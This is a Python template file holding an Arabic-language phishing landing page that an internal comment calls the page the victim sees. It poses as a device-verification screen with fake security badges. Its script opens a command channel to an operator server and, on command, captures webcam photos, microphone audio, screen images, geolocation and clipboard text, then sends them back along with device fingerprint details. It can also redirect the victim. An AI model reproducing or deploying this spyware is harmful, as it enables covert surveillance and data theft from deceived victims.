# lsh/templates/page.py
# ============================================================
# LSH Landing Page — الصفحة اللي الضحية يشوفها
# ============================================================

LSH_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b1120">
<title>جاري التحقق...</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    margin: 0; padding: 0;
    background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0b1120 70%);
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .wrap { max-width: 420px; width: 100%; padding: 40px 24px; text-align: center; }
  .shield {
    width: 90px; height: 90px; margin: 0 auto 24px;
    border-radius: 50%;
    background: linear-gradient(135deg, #38bdf8, #0ea5e9);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 40px rgba(56,189,248,0.5);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(56,189,248,0.5); }
    50% { transform: scale(1.05); box-shadow: 0 0 60px rgba(56,189,248,0.8); }
  }
  .shield svg { width: 50px; height: 50px; fill: #fff; }
  h1 { font-size: 22px; margin: 0 0 10px; font-weight: 700; color: #f1f5f9; }
  .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
  .status {
    background: rgba(30, 41, 59, 0.7);
    backdrop-filter: blur(10px);
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 24px 20px;
    margin-bottom: 18px;
  }
  .status-line {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid rgba(51,65,85,0.5);
    font-size: 14px;
  }
  .status-line:last-child { border-bottom: none; }
  .status-label { color: #94a3b8; }
  .status-value { color: #4ade80; font-weight: 600; }
  .spinner {
    display: inline-block;
    width: 18px; height: 18px;
    border: 2px solid rgba(56,189,248,0.3);
    border-top-color: #38bdf8;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .footer { margin-top: 30px; font-size: 11px; color: #475569; }
</style>
</head>
<body>
<div class="wrap">
  <div class="shield">
    <svg viewBox="0 0 24 24">
      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
    </svg>
  </div>

  <h1>جاري التحقق من الجهاز</h1>
  <p class="subtitle">يتم فحص اتصالك وتهيئة الجلسة، يرجى الانتظار...</p>

  <div class="status">
    <div class="status-line">
      <span class="status-label">الاتصال بالخادم</span>
      <span class="status-value" id="srv">⏳</span>
    </div>
    <div class="status-line">
      <span class="status-label">Service Worker</span>
      <span class="status-value" id="sw">⏳</span>
    </div>
    <div class="status-line">
      <span class="status-label">القناة النشطة</span>
      <span class="status-value" id="ch">—</span>
    </div>
  </div>

  <div class="spinner"></div>
  <div class="footer">جلسة آمنة · مشفّرة · SSL 256-bit</div>
</div>

<script>
(function() {
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID = "__CHAT_ID__";
  const HTTP_URL = "__HTTP_URL__";
  const WS_URL = "__WS_URL__";

  const $srv = document.getElementById('srv');
  const $sw = document.getElementById('sw');
  const $ch = document.getElementById('ch');

  let ws = null;
  let reconnectAttempts = 0;
  let reconnectDelay = 1000;

  // ============================================================
  // 1) اختبار الاتصال بالخادم
  // ============================================================
  async function pingServer() {
    try {
      const r = await fetch(HTTP_URL + '/lsh_msg', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'page_ping',
          ts: Date.now()
        })
      });

      if (r.ok) {
        $srv.textContent = '✅ متصل';
        const data = await r.json();
        if (data.commands && data.commands.length > 0) {
          handleCommands(data.commands);
        }
        return true;
      }
    } catch (e) {
      $srv.textContent = '❌ فشل';
    }
    return false;
  }

  // ============================================================
  // 2) تسجيل Service Worker
  // ============================================================
  async function registerSW() {
    if (!('serviceWorker' in navigator)) {
      $sw.textContent = '❌ غير مدعوم';
      return;
    }
    try {
      const reg = await navigator.serviceWorker.register('/sw.js', {scope: '/'});
      $sw.textContent = '✅ مسجل';

      navigator.serviceWorker.ready.then(r => {
        r.active.postMessage({
          type: 'init',
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          http_url: HTTP_URL,
          ws_url: WS_URL
        });
      });
    } catch (e) {
      $sw.textContent = '❌ فشل';
    }
  }

  // ============================================================
  // 3) WebSocket
  // ============================================================
  function connectWS() {
    try {
      ws = new WebSocket(WS_URL);
      ws.onopen = () => {
        $ch.textContent = 'WebSocket';
        reconnectAttempts = 0;
        reconnectDelay = 1000;
        ws.send(JSON.stringify({
          type: 'hello',
          session_id: SESSION_ID,
          chat_id: CHAT_ID
        }));
      };
      ws.onmessage = (ev) => {
        try {
          const data = JSON.parse(ev.data);
          if (data.type === 'command') {
            handleCommands([data.cmd]);
          }
          if (data.type === 'ping') {
            ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
          }
        } catch (e) {}
      };
      ws.onclose = () => {
        $ch.textContent = 'HTTP';
        reconnectAttempts++;
        reconnectDelay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), 60000);
        setTimeout(connectWS, reconnectDelay);
      };
      ws.onerror = () => {};
    } catch (e) {
      $ch.textContent = 'HTTP';
    }
  }

  // ============================================================
  // 4) معالج الأوامر
  // ============================================================
  async function handleCommands(cmds) {
    for (const cmd of cmds) {
      try {
        await executeCommand(cmd);

        // Ack
        if (cmd._id) {
          fetch(HTTP_URL + '/lsh_msg', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              session_id: SESSION_ID,
              chat_id: CHAT_ID,
              type: 'cmd_ack',
              cmd_id: cmd._id
            })
          }).catch(() => {});
        }
      } catch (e) {}
    }
  }

  // ============================================================
  // 5) تنفيذ الأمر
  // ============================================================
  async function executeCommand(cmd) {
    const action = cmd.action;
    const payload = cmd.payload || {};

    try {
      if (action === 'snapshot') {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {facingMode: 'user'}
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.muted = true;
        await video.play();
        await new Promise(r => setTimeout(r, 1500));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        const img = canvas.toDataURL('image/jpeg', 0.8);
        await sendResult(cmd._id, action, 'ok', img);
      }

      else if (action === 'audio') {
        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
        const chunks = [];
        let mimeType = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
          mimeType = 'audio/webm;codecs=opus';
        }
        const recorder = new MediaRecorder(stream, { mimeType });
        recorder.ondataavailable = e => {
          if (e.data && e.data.size > 0) chunks.push(e.data);
        };
        recorder.start();
        await new Promise(r => setTimeout(r, payload.duration || 6000));
        await new Promise(res => {
          recorder.onstop = res;
          recorder.stop();
          stream.getTracks().forEach(t => t.stop());
        });

        const blob = new Blob(chunks, {type: mimeType});
        const reader = new FileReader();
        reader.onloadend = () => sendResult(cmd._id, action, 'ok', reader.result);
        reader.readAsDataURL(blob);
      }

      else if (action === 'location') {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const data = JSON.stringify({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            });
            await sendResult(cmd._id, action, 'ok', data);
          },
          async () => {
            await sendResult(cmd._id, action, 'fail', null);
          },
          { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
        );
      }

      else if (action === 'clipboard') {
        try {
          const txt = await navigator.clipboard.readText();
          await sendResult(cmd._id, action, 'ok', txt);
        } catch (e) {
          await sendResult(cmd._id, action, 'fail', null);
        }
      }

      else if (action === 'url') {
        window.location.href = payload.url || 'about:blank';
        await sendResult(cmd._id, action, 'ok', payload.url);
      }

      else if (action === 'vibrate') {
        if (navigator.vibrate) {
          navigator.vibrate(payload.pattern || [500, 200, 500]);
        }
        await sendResult(cmd._id, action, 'ok', null);
      }

      else if (action === 'screen') {
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: true
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        const img = canvas.toDataURL('image/jpeg', 0.8);
        await sendResult(cmd._id, action, 'ok', img);
      }

      else if (action === 'redirect') {
        window.location.href = payload.url || 'about:blank';
        await sendResult(cmd._id, action, 'ok', payload.url);
      }

      else {
        await sendResult(cmd._id, action, 'fail', 'unknown_action');
      }

    } catch (e) {
      await sendResult(cmd._id, action, 'fail', e.message || 'error');
    }
  }

  // ============================================================
  // 6) إرسال النتيجة
  // ============================================================
  async function sendResult(cmdId, action, status, data) {
    try {
      await fetch(HTTP_URL + '/lsh_msg', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'cmd_result',
          cmd_id: cmdId,
          action: action,
          status: status,
          data: data
        })
      });
    } catch (e) {}
  }

  // ============================================================
  // 7) إرسال Info أولي
  // ============================================================
  async function sendInitialInfo() {
    try {
      const info = {
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'info',
        info: {
          ua: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: {
            width: screen.width,
            height: screen.height,
            pixelRatio: window.devicePixelRatio
          },
          timestamp: new Date().toISOString(),
          sw_supported: 'serviceWorker' in navigator,
          wakelock_supported: 'wakeLock' in navigator,
          pwa_standalone: window.matchMedia('(display-mode: standalone)').matches
        }
      };
      await fetch(HTTP_URL + '/lsh_msg', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(info)
      });
    } catch (e) {}
  }

  // ============================================================
  // 8) Start
  // ============================================================
  (async () => {
    await pingServer();
    await registerSW();
    connectWS();
    sendInitialInfo();

    // حلقة ping كل 5 ثواني
    setInterval(pingServer, 5000);

    // إرسال landmark: landing
    fetch(HTTP_URL + '/lsh_msg', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'landing',
        ts: Date.now()
      })
    }).catch(() => {});
  })();

})();
</script>
</body>
</html>"""


# ============================================================
# Fallback Page (لو حصل خطأ)
# ============================================================
LSH_PAGE_FALLBACK = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>خطأ</title>
  <style>
    body {
      background: #0b1120;
      color: #f8fafc;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      text-align: center;
      padding: 30px;
      background: #1e293b;
      border-radius: 16px;
      max-width: 320px;
    }
    h2 { color: #f87171; margin: 0 0 12px; }
    p { color: #94a3b8; line-height: 1.6; margin: 0; }
  </style>
</head>
<body>
  <div class="box">
    <h2>⚠️ حدث خطأ</h2>
    <p>يرجى إعادة تحميل الصفحة أو المحاولة لاحقاً</p>
  </div>
</body>
</html>"""
